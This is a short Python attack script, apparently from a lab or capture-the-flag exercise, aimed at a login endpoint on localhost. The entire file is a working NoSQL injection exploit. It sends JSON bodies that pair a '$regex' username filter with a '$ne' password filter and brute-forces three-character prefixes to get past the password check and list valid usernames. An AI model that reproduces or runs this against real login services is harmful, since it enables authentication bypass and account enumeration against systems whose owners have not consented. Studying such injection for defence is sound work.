#!/usr/bin/python3

import requests, json, pdb, string, sys, signal


def def_handler(sig, frame):
    print("\n\n[!] SAliendo ... \n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

chararacters=string.ascii_letters + string.digits

main_url = "http://localhost:4000/user/login"


def getUsers():
    
    headers = {'Content-Type' : 'application/json'}

    for first_character in chararacters:
        for second_character in chararacters:
           for third_character in chararacters: 
                post_data= '{"username":{"$regex":"^%s%s%s"},"password":{"$ne":"pepe"}}' % (first_character, second_character, third_character)

                r = requests.post(main_url, data=post_data, headers=headers)
                #print (post_data)
                if "Invalid username or passsword." not in r.text:
                    #pdb.set_trace()
                    response = json.loads(r.text)
                    print("\n[+] El usaurio %s es un usuario valido" %response['username'])

if __name__ == '__main__':
    getUsers()
